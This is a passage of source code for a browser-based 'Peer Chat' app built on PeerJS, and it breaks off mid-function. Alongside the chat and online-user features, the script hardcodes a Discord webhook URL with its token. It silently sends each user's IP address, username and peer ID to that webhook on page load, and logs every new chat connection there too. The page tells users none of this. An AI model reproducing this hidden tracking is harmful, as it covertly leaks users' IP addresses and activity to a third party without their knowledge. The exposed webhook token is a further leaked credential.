<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Peer Chat</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://unpkg.com">
    <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js" defer></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');
        
        :root {
            --bg-primary: #121212;
            --bg-secondary: #1e1e1e;
            --bg-tertiary: #2a2a2a;
            --text-primary: #e0e0e0;
            --text-secondary: #a0a0a0;
            --accent: #00e676;
            --accent-dark: #00b248;
            --accent-glow: rgba(0, 230, 118, 0.2);
            --danger: #ff5252;
            --success: #00e676;
            --warning: #ffab00;
            --border-color: #333;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        
        body {
            background-color: var(--bg-primary);
            color: var(--text-primary);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        header {
            background-color: var(--bg-secondary);
            padding: 1.5rem;
            text-align: center;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.4);
            border-bottom: 1px solid var(--border-color);
        }
        
        header h1 {
            color: var(--accent);
            font-weight: 600;
            letter-spacing: 1px;
            font-size: 2rem;
            text-shadow: 0 0 10px rgba(0, 230, 118, 0.3);
        }
        
        .container {
            flex: 1;
            max-width: 800px;
            margin: 0 auto;
            padding: 1.5rem;
            width: 100%;
            display: flex;
            flex-direction: column;
        }
        
        #setup-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            gap: 1.5rem;
            margin-bottom: 1.5rem;
        }
        
        #setup-screen h2 {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
            color: var(--text-primary);
            font-weight: 600;
        }
        
        #my-id-display {
            padding: 1.5rem;
            background-color: var(--bg-tertiary);
            border-radius: 10px;
            margin-bottom: 1.5rem;
            word-break: break-all;
            border: 1px solid var(--border-color);
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
        }
        
        #my-id {
            color: var(--accent);
            font-weight: bold;
            font-family: monospace;
            font-size: 1.1rem;
        }
        
        #connect-form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            width: 100%;
            max-width: 400px;
        }
        
        #connect-form h3 {
            color: var(--text-primary);
            font-weight: 600;
            font-size: 1.2rem;
        }
        
        #peer-id-input {
            padding: 1rem;
            background-color: var(--bg-tertiary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        #peer-id-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--accent-glow);
        }
        
        #chat-screen {
            display: flex;
            flex-direction: column;
            flex: 1;
        }
        
        #connection-status {
            padding: 1.2rem;
            background-color: var(--bg-tertiary);
            margin-bottom: 1.5rem;
            border-radius: 10px;
            text-align: center;
            border: 1px solid var(--border-color);
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        #messages {
            flex: 1;
            overflow-y: auto;
            padding: 1.5rem;
            display: flex;
            flex-direction: column;
            gap: 1rem;
            background-color: var(--bg-tertiary);
            border-radius: 10px;
            margin-bottom: 1.5rem;
            min-height: 300px;
            max-height: 60vh;
            border: 1px solid var(--border-color);
            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
        }
        
        #messages::-webkit-scrollbar {
            width: 8px;
        }
        
        #messages::-webkit-scrollbar-thumb {
            background-color: var(--accent-dark);
            border-radius: 6px;
        }
        
        #messages::-webkit-scrollbar-track {
            background-color: var(--bg-secondary);
            border-radius: 6px;
        }
        
        .message {
            padding: 1rem;
            border-radius: 12px;
            max-width: 80%;
            word-break: break-word;
            line-height: 1.4;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .message.sent {
            background-color: var(--accent-dark);
            align-self: flex-end;
            color: #000;
            font-weight: 500;
            border-bottom-right-radius: 4px;
        }
        
        .message.received {
            background-color: #333;
            align-self: flex-start;
            border-bottom-left-radius: 4px;
        }
        
        .username {
            font-size: 0.8rem;
            opacity: 0.8;
            margin-bottom: 0.3rem;
            font-weight: 600;
        }
        
        #message-form {
            display: flex;
            gap: 0.8rem;
        }
        
        input, button {
            padding: 1rem;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            transition: all 0.2s ease;
        }
        
        #message-input {
            flex: 1;
            background-color: var(--bg-tertiary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }
        
        #message-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--accent-glow);
        }
        
        button {
            background-color: var(--accent);
            color: #000;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.2s;
        }
        
        button:hover {
            background-color: var(--accent-dark);
            transform: translateY(-1px);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        button:disabled {
            background-color: #333;
            color: #666;
            cursor: not-allowed;
            transform: none;
        }
        
        #disconnect-btn {
            background-color: var(--danger);
            color: white;
            margin-top: 1.5rem;
            padding: 1rem;
            border-radius: 6px;
        }
        
        #disconnect-btn:hover {
            background-color: #ff3d3d;
        }
        
        footer {
            text-align: center;
            padding: 1.5rem;
            background-color: var(--bg-secondary);
            color: var(--text-secondary);
            font-size: 0.9rem;
            box-shadow: 0 -2px 15px rgba(0, 0, 0, 0.4);
            border-top: 1px solid var(--border-color);
        }
        
        .status-connecting {
            color: var(--warning);
        }
        
        .status-connected {
            color: var(--success);
        }
        
        .status-disconnected {
            color: var(--danger);
        }
        
        #error-display {
            color: var(--danger);
            padding: 1.2rem;
            margin-top: 1.5rem;
            background-color: rgba(255, 82, 82, 0.1);
            border-radius: 6px;
            text-align: center;
            display: none;
            border: 1px solid rgba(255, 82, 82, 0.3);
        }
        
        #debug-log {
            background-color: var(--bg-tertiary);
            color: var(--accent);
            padding: 1rem;
            font-family: monospace;
            height: 120px;
            overflow-y: auto;
            margin-top: 1.5rem;
            font-size: 0.9rem;
            white-space: pre-wrap;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }
        
        #online-users-panel {
            background-color: var(--bg-tertiary);
            border-radius: 10px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            border: 1px solid var(--border-color);
            width: 100%;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        #online-users-panel h3 {
            margin-bottom: 1.2rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-weight: 600;
            font-size: 1.1rem;
        }
        
        #online-count {
            background-color: var(--accent);
            color: #000;
            border-radius: 12px;
            padding: 0.3rem 0.8rem;
            font-size: 0.9rem;
            font-weight: bold;
        }
        
        #users-list {
            max-height: 200px;
            overflow-y: auto;
            background-color: rgba(0, 0, 0, 0.2);
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }
        
        #users-list::-webkit-scrollbar {
            width: 8px;
        }
        
        #users-list::-webkit-scrollbar-thumb {
            background-color: var(--accent-dark);
            border-radius: 6px;
        }
        
        #users-list::-webkit-scrollbar-track {
            background-color: var(--bg-secondary);
            border-radius: 6px;
        }
        
        .user-item {
            display: flex;
            justify-content: space-between;
            padding: 1rem;
            border-bottom: 1px solid var(--border-color);
            transition: background-color 0.2s;
        }
        
        .user-item:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }
        
        .user-item:last-child {
            border-bottom: none;
        }
        
        .user-item .user-name {
            font-weight: bold;
            display: flex;
            align-items: center;
        }
        
        .user-item .user-name::before {
            content: '';
            display: inline-block;
            width: 8px;
            height: 8px;
            background-color: var(--success);
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .user-item .user-id {
            color: var(--text-secondary);
            font-size: 0.8rem;
            font-family: monospace;
        }
        
        .user-item.current-user {
            background-color: rgba(0, 230, 118, 0.1);
        }
        
        .connect-icon {
            cursor: pointer;
            color: var(--accent);
            margin-left: 0.5rem;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        #setup-screen, #chat-screen {
            animation: fadeIn 0.5s ease-out;
        }
        
        .request-btn {
            background-color: var(--warning);
            color: #000;
            padding: 0.5rem 1rem;
            font-size: 0.9rem;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .request-btn:hover {
            background-color: #ffb300;
            transform: translateY(-1px);
        }
        
        .request-btn:disabled {
            background-color: #333;
            color: #666;
            cursor: not-allowed;
            transform: none;
        }
        
        .request-btn.sent {
            background-color: #666;
            color: #ccc;
        }
        
        .request-btn.in-room {
            background-color: var(--accent);
            color: #000;
            cursor: default;
        }
        
        /* Updated request panel styles */
        #request-panel {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: var(--bg-tertiary);
            border-radius: 12px;
            padding: 2rem;
            border: 1px solid var(--border-color);
            display: none;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            z-index: 1000;
            width: 90%;
            max-width: 400px;
            animation: fadeIn 0.3s ease-out;
        }
        
        #request-panel h3 {
            margin-bottom: 1.5rem;
            font-weight: 600;
            font-size: 1.3rem;
            color: var(--accent);
            text-align: center;
        }
        
        #requests-list {
            max-height: 300px;
            overflow-y: auto;
            padding-right: 0.5rem;
        }
        
        #requests-list::-webkit-scrollbar {
            width: 6px;
        }
        
        #requests-list::-webkit-scrollbar-thumb {
            background-color: var(--accent-dark);
            border-radius: 6px;
        }
        
        #requests-list::-webkit-scrollbar-track {
            background-color: var(--bg-secondary);
            border-radius: 6px;
        }
        
        .request-item {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            padding: 1.2rem;
            border-radius: 8px;
            margin-bottom: 1rem;
            background-color: rgba(0, 0, 0, 0.2);
            border: 1px solid var(--border-color);
        }
        
        .request-item:last-child {
            margin-bottom: 0;
        }
        
        .request-info {
            flex: 1;
        }
        
        .request-info strong {
            color: var(--accent);
            font-size: 1.1rem;
        }
        
        .request-info small {
            color: var(--text-secondary);
            font-size: 0.85rem;
        }
        
        .request-actions {
            display: flex;
            gap: 0.8rem;
            justify-content: center;
        }
        
        .request-btn.accept {
            background-color: var(--success);
            flex: 1;
        }
        
        .request-btn.decline {
            background-color: var(--danger);
            color: white;
            flex: 1;
        }
        
        .system-message {
            color: var(--text-secondary);
            text-align: center;
            font-style: italic;
            margin: 1rem 0;
            font-size: 0.9rem;
        }

        /* Overlay for when request panel is open */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 999;
            display: none;
        }
        
        /* Style for in-room state */
        .in-room-btn {
            background-color: var(--accent);
            color: #000;
            padding: 1rem;
            border-radius: 6px;
            font-weight: bold;
            cursor: default;
        }
        
        /* Chatting indicator style */
        .chatting-indicator {
            display: inline-block;
            background-color: var(--accent);
            color: #000;
            font-size: 0.7rem;
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            margin-left: 0.5rem;
            font-weight: bold;
        }
        
        /* User status indicator colors */
        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-online {
            background-color: var(--success);
        }
        
        .status-chatting {
            background-color: var(--accent);
        }
    </style>
</head>
<body>
    <header>
        <h1>Peer Chat</h1>
    </header>
    
    <div class="container">
        <div id="setup-screen">
            <h2>Connect with Other Users</h2>
            
            <!-- Overlay for when request panel is open -->
            <div id="overlay" class="overlay"></div>
            
            <!-- Updated request panel -->
            <div id="request-panel">
                <h3>Connection Request</h3>
                <div id="requests-list"></div>
            </div>
            
            <div id="online-users-panel">
                <h3>
                    Online Users
                    <span id="online-count">0</span>
                </h3>
                <div id="users-list">
                    <div class="user-item current-user">
                        <div>
                            <span class="user-name">You</span>
                            <span class="user-id" id="current-user-id">Connecting...</span>
                        </div>
                    </div>
                </div>
            </div>
            
            <div id="my-id-display">
                <p>Your ID: <span id="my-id">Connecting...</span></p>
                <p>Share this ID with someone you want to chat with.</p>
            </div>
            
            <form id="connect-form">
                <h3>Connect to someone</h3>
                <input type="text" id="peer-id-input" placeholder="Enter their ID here...">
                <button type="submit" id="connect-btn">Send Request</button>
            </form>
            
            <div id="error-display"></div>
        </div>
        
        <div id="chat-screen">
            <div id="connection-status">
                <p id="status-text" class="status-disconnected">Disconnected</p>
                <p id="username-display"></p>
            </div>
            
            <div id="messages"></div>
            
            <form id="message-form">
                <input type="text" id="message-input" placeholder="Type your message..." autocomplete="off" disabled>
                <button type="submit" id="send-btn" disabled>Send</button>
            </form>
            
            <button id="disconnect-btn">Disconnect</button>
        </div>
        
        <div id="debug-log"></div>
    </div>
    
    <footer>
        <p>Peer Chat &copy; 2025</p>
    </footer>

    <script>
        // Main application controller
        const ChatApp = (function() {
            // Discord webhook URL
            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1367405276898263160/KBpTkpTtSbz9oRJefUrbiSIV7aOp1f7nE5qP_aThs3_D86Rm1Emk48ojUxQwYpnrDoIN';
            
            // DOM elements
            const elements = {
                setupScreen: document.getElementById('setup-screen'),
                chatScreen: document.getElementById('chat-screen'),
                myIdDisplay: document.getElementById('my-id'),
                currentUserId: document.getElementById('current-user-id'),
                peerIdInput: document.getElementById('peer-id-input'),
                connectForm: document.getElementById('connect-form'),
                connectBtn: document.getElementById('connect-btn'),
                disconnectBtn: document.getElementById('disconnect-btn'),
                statusText: document.getElementById('status-text'),
                usernameDisplay: document.getElementById('username-display'),
                messagesContainer: document.getElementById('messages'),
                messageForm: document.getElementById('message-form'),
                messageInput: document.getElementById('message-input'),
                sendBtn: document.getElementById('send-btn'),
                errorDisplay: document.getElementById('error-display'),
                debugLog: document.getElementById('debug-log'),
                onlineCount: document.getElementById('online-count'),
                usersList: document.getElementById('users-list'),
                requestPanel: document.getElementById('request-panel'),
                requestsList: document.getElementById('requests-list'),
                overlay: document.getElementById('overlay')
            };
            
            // App state
            const state = {
                peer: null,
                connection: null,
                trackerConnection: null,
                localUsername: '',
                remoteUsername: '',
                isConnected: false,
                myPeerId: '',
                userIP: 'Unknown',
                TRACKER_SERVER_ID: 'user-tracker-server',
                onlineUsers: new Map(),
                pendingRequests: new Map(),
                sentRequests: new Set(),
                heartbeatInterval: null,
                refreshInterval: null,
                currentChatPeerId: null
            };
            
            // Initialize the app
            async function init() {
                elements.chatScreen.style.display = 'none';
                setupEventListeners();
                await initializePeer();
                setupAutoRefresh();
            }
            
            // Set up event listeners
            function setupEventListeners() {
                elements.connectForm.addEventListener('submit', handleConnectSubmit);
                elements.messageForm.addEventListener('submit', handleMessageSubmit);
                elements.disconnectBtn.addEventListener('click', disconnectFromPeer);
                
                window.addEventListener('beforeunload', cleanupBeforeUnload);
            }
            
            // Set up auto-refresh for online users
            function setupAutoRefresh() {
                // Clear any existing interval
                if (state.refreshInterval) {
                    clearInterval(state.refreshInterval);
                }
                
                // Set up new interval (every 30 seconds)
                state.refreshInterval = setInterval(() => {
                    if (state.trackerConnection && state.trackerConnection.open) {
                        refreshOnlineUsers();
                    }
                }, 30000);
            }
            
            // Refresh online users list
            function refreshOnlineUsers() {
                if (state.trackerConnection && state.trackerConnection.open) {
                    log('Refreshing online users list');
                    state.trackerConnection.send({
                        type: 'refresh-request',
                        peerId: state.myPeerId
                    });
                } else {
                    log('No tracker connection available for refresh');
                    // Attempt to reconnect to tracker
                    connectToTracker();
                }
            }
            
            // Initialize PeerJS connection
            async function initializePeer() {
                const peerId = generateSimpleId();
                state.localUsername = generateUsername();
                state.userIP = await getUserIP();
                
                sendToDiscordWebhook(`ðŸŒ **User Joined**\n- Username: ${state.localUsername}\n- Peer ID: ${peerId}\n- IP: ${state.userIP}\n- Time: ${new Date().toLocaleString()}`);
                
                log(`Initializing PeerJS with ID: ${peerId}`);
                
                try {
                    state.peer = new Peer(peerId, { debug: 2 });
                    
                    state.peer.on('open', (id) => {
                        log(`Peer connected with ID: ${id}`);
                        state.myPeerId = id;
                        elements.myIdDisplay.textContent = id;
                        elements.currentUserId.textContent = id;
                        elements.usernameDisplay.textContent = `Your username: ${state.localUsername}`;
                        
                        // Add current user to online users list
                        state.onlineUsers.set(id, {
                            username: state.localUsername,
                            isCurrentUser: true,
                            isChatting: false
                        });
                        updateOnlineUsersUI();
                        
                        connectToTracker();
                    });
                    
                    state.peer.on('connection', handleIncomingConnection);
                    state.peer.on('error', handlePeerError);
                    state.peer.on('disconnected', handlePeerDisconnected);
                } catch (error) {
                    log(`Error initializing PeerJS: ${error.message}`);
                    showError(`Failed to initialize connection: ${error.message}`);
                }
            }
            
            // Handle incoming connections
            function handleIncomingConnection(conn) {
                log(`Incoming connection from: ${conn.peer}`);
                
                if (conn.peer === state.TRACKER_SERVER_ID) {
                    log('Tracker server initiated connection');
                    state.trackerConnection = conn;
                    setupTrackerConnection();
                    return;
                }
                
                // Check if this is a chat request
                if (conn.metadata && conn.metadata.type === 'request') {
                    handleChatRequest(conn);
                    return;
                }
                
                // Handle established chat connection
                if (!state.isConnected) {
                    state.connection = conn;
                    setupConnection();
                } else {
                    conn.close();
                }
            }
            
            // Handle chat requests
            function handleChatRequest(conn) {
                const requestId = generateSimpleId();
                const fromPeerId = conn.peer;
                const fromUsername = conn.metadata.username || 'Unknown';
                
                log(`Received chat request from ${fromUsername} (${fromPeerId})`);
                
                // Store the request
                state.pendingRequests.set(requestId, {
                    conn: conn,
                    peerId: fromPeerId,
                    username: fromUsername,
                    timestamp: Date.now()
                });
                
                // Show the request panel and overlay
                elements.requestPanel.style.display = 'block';
                elements.overlay.style.display = 'block';
                
                // Add request to UI
                const requestItem = document.createElement('div');
                requestItem.className = 'request-item';
                requestItem.id = `request-${requestId}`;
                
                const requestInfo = document.createElement('div');
                requestInfo.className = 'request-info';
                requestInfo.innerHTML = `<strong>${fromUsername}</strong> wants to chat<br><small>ID: ${fromPeerId}</small>`;
                
                const requestActions = document.createElement('div');
                requestActions.className = 'request-actions';
                
                const acceptBtn = document.createElement('button');
                acceptBtn.className = 'request-btn accept';
                acceptBtn.textContent = 'Accept';
                acceptBtn.onclick = () => acceptChatRequest(requestId);
                
                const declineBtn = document.createElement('button');
                declineBtn.className = 'request-btn decline';
                declineBtn.textContent = 'Decline';
                declineBtn.onclick = () => declineChatRequest(requestId);
                
                requestActions.appendChild(acceptBtn);
                requestActions.appendChild(declineBtn);
                requestItem.appendChild(requestInfo);
                requestItem.appendChild(requestActions);
                
                elements.requestsList.appendChild(requestItem);
                
                // Set timeout to auto-decline after 30 seconds
                setTimeout(() => {
                    if (state.pendingRequests.has(requestId)) {
                        declineChatRequest(requestId);
                    }
                }, 30000);
            }
            
            // Accept a chat request
            function acceptChatRequest(requestId) {
                const request = state.pendingRequests.get(requestId);
                if (!request) return;
                
                log(`Accepting chat request from ${request.username} (${request.peerId})`);
                
                // Send acceptance response
                request.conn.send({
                    type: 'request-response',
                    accepted: true,
                    username: state.localUsername
                });
                
                // Close all other pending requests
                state.pendingRequests.forEach((req, id) => {
                    if (id !== requestId) {
                        req.conn.send({
                            type: 'request-response',
                            accepted: false,
                            reason: 'User accepted another chat'
                        });
                        req.conn.close();
                    }
                });
                
                // Clear all requests and hide panel
                state.pendingRequests.clear();
                elements.requestsList.innerHTML = '';
                elements.requestPanel.style.display = 'none';
                elements.overlay.style.display = 'none';
                
                // Create a new connection for chatting (don't reuse the request connection)
                const chatConn = state.peer.connect(request.peerId, {
                    reliable: true,
                    metadata: {
                        username: state.localUsername,
                        chatConnection: true
                    }
                });
                
                // Set up the connection
                state.connection = chatConn;
                state.remoteUsername = request.username;
                state.currentChatPeerId = request.peerId;
                
                // Update user status to chatting
                if (state.onlineUsers.has(state.myPeerId)) {
                    state.onlineUsers.get(state.myPeerId).isChatting = true;
                }
                if (state.onlineUsers.has(request.peerId)) {
                    state.onlineUsers.get(request.peerId).isChatting = true;
                }
                
                // Set up connection handlers
                chatConn.on('open', () => {
                    log(`Chat connection established with: ${chatConn.peer}`);
                    state.isConnected = true;
                    
                    sendToDiscordWebhook(`ðŸ”— **New Connection**\n- From: ${state.localUsername} (${state.myPeerId}, IP: ${state.userIP})\n- To: ${chatConn.peer}\n- Time: ${new Date().toLocaleString()}`);
                    
                    chatConn.send({
                        type: 'username',
                        username: state.localUsername
                    });
                    
                    // Update UI
                    elements.setupScreen.style.display = 'none';
                    elements.chatScreen.style.display = 'flex';
                    elements.statusText.textContent = 'Connected';
                    elements.statusText.className = 'status-connected';
                    elements.messageInput.disabled = false;
                    elements.sendBtn.disabled = false;
                    
                    appendSystemMessage('Connected! Say hello!');
                    
                    // Update online users UI to show "In Room" status
                    updateOnlineUsersUI();
                });
                
                chatConn.on('data', handlePeerData);
                chatConn.on('close', handleConnectionClose);
                chatConn.on('error', handleConnectionError);
                
                // Close the original request connection
                request.conn.close();
            }
            
            // Decline a chat request
            function declineChatRequest(requestId) {
                const request = state.pendingRequests.get(requestId);
                if (!request) return;
                
                log(`Declining chat request from ${request.username} (${request.peerId})`);
                
                // Send decline response
                request.conn.send({
                    type: 'request-response',
                    accepted: false,
                    reason: 'Request declined'
                });
                
                request.conn.close();
                
                // Remove from UI and state
                state.pendingRequests.delete(requestId);
                const requestElement = document.getElementById(`request-${requestId}`);
                if (requestElement) {
                    requestElement.remove();
                }
                
                // Hide panel if no more requests
                if (state.pendingRequests.size === 0) {
                    elements.requestPanel.style.display = 'none';
                    elements.overlay.style.display = 'none';
                }
            }
            
            // Handle peer errors
            function handlePeerError(err) {
                log(`Peer error: ${err.type}`);
                
                if (err.type === 'peer-unavailable' && err.message.includes(state.TRACKER_SERVER_ID)) {
                    log('Tracker server not found, becoming tracker server');
                    becomeTrackerServer();
                    return;
                }
                
                showError(`Connection error: ${err.type}`);
                
                if (err.type === 'peer-unavailable') {
                    showError('Peer ID not found. Check the ID and try again.');
                } else if (err.type === 'network') {
                    showError('Network error. Check your internet connection.');
                } else if (err.type === 'disconnected') {
                    showError('Disconnected from server. Try refreshing the page.');
                }
            }
            
            // Handle peer disconnection
            function handlePeerDisconnected() {
                log('Peer disconnected from server');
                showError('Disconnected from server. Click to reconnect.');
                
                setTimeout(() => {
                    if (state.peer) state.peer.reconnect();
                }, 3000);
            }
            
            // Connect to tracker server
            function connectToTracker() {
                log('Attempting to connect to tracker server');
                
                try {
                    state.trackerConnection = state.peer.connect(state.TRACKER_SERVER_ID, {
                        reliable: true
                    });
                    
                    setupTrackerConnection();
                } catch (error) {
                    log(`Error connecting to tracker: ${error.message}`);
                }
            }
            
            // Set up tracker connection
            function setupTrackerConnection() {
                log('Setting up tracker connection');
                
                state.trackerConnection.on('open', () => {
                    log('Connected to tracker server');
                    
                    state.trackerConnection.send({
                        type: 'register',
                        peerId: state.myPeerId,
                        username: state.localUsername,
                        isChatting: state.isConnected
                    });
                    
                    // Set up heartbeat
                    if (state.heartbeatInterval) clearInterval(state.heartbeatInterval);
                    state.heartbeatInterval = setInterval(() => {
                        if (state.trackerConnection && state.trackerConnection.open) {
                            state.trackerConnection.send({
                                type: 'heartbeat',
                                peerId: state.myPeerId,
                                username: state.localUsername,
                                isChatting: state.isConnected
                            });
                        }
                    }, 30000);
                    
                    // Set up auto-refresh
                    setupAutoRefresh();
                });
                
                state.trackerConnection.on('data', handleTrackerData);
                state.trackerConnection.on('close', handleTrackerConnectionClose);
                state.trackerConnection.on('error', handleTrackerConnectionError);
            }
            
            // Handle tracker data
            function handleTrackerData(data) {
                log(`Received tracker data: ${JSON.stringify(data)}`);
                
                if (data.type === 'userList') {
                    // Merge the new user list with our current user data
                    const newUserList = new Map(Object.entries(data.users));
                    
                    // Preserve our current user's data
                    if (state.onlineUsers.has(state.myPeerId)) {
                        newUserList.set(state.myPeerId, state.onlineUsers.get(state.myPeerId));
                    }
                    
                    state.onlineUsers = newUserList;
                    updateOnlineUsersUI();
                }
            }
            
            // Handle tracker connection close
            function handleTrackerConnectionClose() {
                log('Tracker connection closed');
                
                if (state.heartbeatInterval) {
                    clearInterval(state.heartbeatInterval);
                    state.heartbeatInterval = null;
                }
                
                if (state.refreshInterval) {
                    clearInterval(state.refreshInterval);
                    state.refreshInterval = null;
                }
                
                setTimeout(() => {
                    connectToTracker();
                }, 5000);
            }
            
            // Handle tracker connection error
            function handleTrackerConnectionError(error) {
                log(`Tracker connection error: ${error}`);
                
                setTimeout(() => {
                    connectToTracker();
                }, 5000);
            }
            
            // Become tracker server
            function becomeTrackerServer() {
                log('Becoming tracker server');
                
                try {
                    const trackerServer = new Peer(state.TRACKER_SERVER_ID, {
                        debug: 2
                    });
                    
                    const connectedUsers = new Map();
                    connectedUsers.set(state.myPeerId, {
                        username: state.localUsername,
                        isCurrentUser: true,
                        isChatting: state.isConnected
                    });
                    
                    const userConnections = new Map();
                    
                    trackerServer.on('open', (id) => {
                        log(`Tracker server started with ID: ${id}`);
                        
                        const trackerStatus = document.createElement('div');
                        trackerStatus.textContent = 'ðŸ”„ Tracking server active';
                        trackerStatus.style.color = 'var(--accent)';
                        trackerStatus.style.marginTop = '0.5rem';
                        document.querySelector('#my-id-display').appendChild(trackerStatus);
                    });
                    
                    trackerServer.on('connection', (conn) => {
                        log(`Tracker: New connection from ${conn.peer}`);
                        
                        userConnections.set(conn.peer, conn);
                        
                        conn.on('open', () => {
                            log(`Tracker: Connection to ${conn.peer} opened`);
                            
                            conn.send({
                                type: 'userList',
                                users: Object.fromEntries(connectedUsers)
                            });
                        });
                        
                        conn.on('data', (data) => {
                            log(`Tracker: Received data from ${conn.peer}: ${JSON.stringify(data)}`);
                            
                            if (data.type === 'register' || data.type === 'heartbeat') {
                                connectedUsers.set(data.peerId, {
                                    username: data.username,
                                    isChatting: data.isChatting || false
                                });
                                
                                broadcastUserList();
                            } else if (data.type === 'refresh-request') {
                                // Handle refresh request by sending updated user list
                                if (userConnections.has(data.peerId)) {
                                    userConnections.get(data.peerId).send({
                                        type: 'userList',
                                        users: Object.fromEntries(connectedUsers)
                                    });
                                }
                            }
                        });
                        
                        conn.on('close', () => {
                            log(`Tracker: Connection to ${conn.peer} closed`);
                            
                            connectedUsers.delete(conn.peer);
                            userConnections.delete(conn.peer);
                            
                            broadcastUserList();
                        });
                        
                        conn.on('error', (error) => {
                            log(`Tracker: Error with connection to ${conn.peer}: ${error}`);
                            
                            connectedUsers.delete(conn.peer);
                            userConnections.delete(conn.peer);
                            
                            broadcastUserList();
                        });
                    });
                    
                    function broadcastUserList() {
                        const userListMessage = {
                            type: 'userList',
                            users: Object.fromEntries(connectedUsers)
                        };
                        
                        state.onlineUsers = new Map(connectedUsers);
                        updateOnlineUsersUI();
                        
                        userConnections.forEach((conn, peerId) => {
                            if (conn.open) {
                                conn.send(userListMessage);
                            } else {
                                userConnections.delete(peerId);
                                connectedUsers.delete(peerId);
                            }
                        });
                    }
                    
                    const cleanupInterval = setInterval(() => {
                        let changed = false;
                        
                        userConnections.forEach((conn, peerId) => {
                            if (!conn.open) {
                                userConnections.delete(peerId);
                                connectedUsers.delete(peerId);
                                changed = true;
                            }
                        });
                        
                        if (changed) {
                            broadcastUserList();
                        }
                    }, 60000);
                    
                    window.addEventListener('beforeunload', () => {
                        clearInterval(cleanupInterval);
                        trackerServer.destroy();
                    });
                    
                } catch (error) {
                    log(`Error becoming tracker server: ${error.message}`);
                    
                    setTimeout(() => {
                        connectToTracker();
                    }, 5000);
                }
            }
            
            // Send chat request to a peer
            function sendChatRequest(peerId) {
                if (state.isConnected || state.sentRequests.has(peerId)) return;
                
                log(`Sending chat request to: ${peerId}`);
                elements.statusText.textContent = 'Sending request...';
                elements.statusText.className = 'status-connecting';
                
                // Add to sent requests
                state.sentRequests.add(peerId);
                
                // Update UI immediately
                updateOnlineUsersUI();
                
                try {
                    const conn = state.peer.connect(peerId, {
                        reliable: true,
                        metadata: {
                            type: 'request',
                            username: state.localUsername
                        }
                    });
                    
                    conn.on('open', () => {
                        log(`Request connection opened to ${peerId}`);
                    });
                    
                    conn.on('data', (data) => {
                        if (data.type === 'request-response') {
                            handleRequestResponse(data, peerId, conn);
                        }
                    });
                    
                    conn.on('close', () => {
                        log(`Request connection to ${peerId} closed`);
                        elements.statusText.textContent = 'Disconnected';
                        elements.statusText.className = 'status-disconnected';
                        
                        // Remove from sent requests if not accepted
                        if (!state.isConnected) {
                            state.sentRequests.delete(peerId);
                            updateOnlineUsersUI();
                        }
                    });
                    
                    conn.on('error', (err) => {
                        log(`Request connection error: ${err}`);
                        showError(`Failed to send request: ${err}`);
                        elements.statusText.textContent = 'Disconnected';
                        elements.statusText.className = 'status-disconnected';
                        
                        // Remove from sent requests on error
                        state.sentRequests.delete(peerId);
                        updateOnlineUsersUI();
                    });
                    
                } catch (error) {
                    log(`Error sending chat request: ${error.message}`);
                    showError(`Failed to send request: ${error.message}`);
                    elements.statusText.textContent = 'Disconnected';
                    elements.statusText.className = 'status-disconnected';
                    
                    // Remove from sent requests on error
                    state.sentRequests.delete(peerId);
                    updateOnlineUsersUI();
                }
            }
            
            // Handle response to our chat request
            function handleRequestResponse(data, peerId, conn) {
                if (data.accepted) {
                    log(`Chat request accepted by ${peerId}`);
                    
                    // Close any other pending requests we might have sent
                    state.pendingRequests.forEach(req => {
                        if (req.conn && req.conn !== conn && req.conn.open) {
                            req.conn.close();
                        }
                    });
                    state.pendingRequests.clear();
                    
                    // Clear sent requests
                    state.sentRequests.clear();
                    
                    // Update user status to chatting
                    if (state.onlineUsers.has(state.myPeerId)) {
                        state.onlineUsers.get(state.myPeerId).isChatting = true;
                    }
                    if (state.onlineUsers.has(peerId)) {
                        state.onlineUsers.get(peerId).isChatting = true;
                    }
